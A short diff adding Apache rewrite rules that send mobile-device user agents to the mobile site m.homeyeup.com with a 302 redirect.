@@ -1,0 +1,4 @@
+RewriteEngine On
+RewriteBase /
+RewriteCond %{HTTP_USER_AGENT} "(baidu.Transcoder|mini|android|blackberry|googlebot-mobile|iemobile|Mobile|ipad|iphone|ipod|opera mobile|palmos|webos|ucweb|Windows Phone|Symbian|hpwOS)" [NC]
+RewriteRule ^(.*)$ http://m.homeyeup.com [L,R=302]
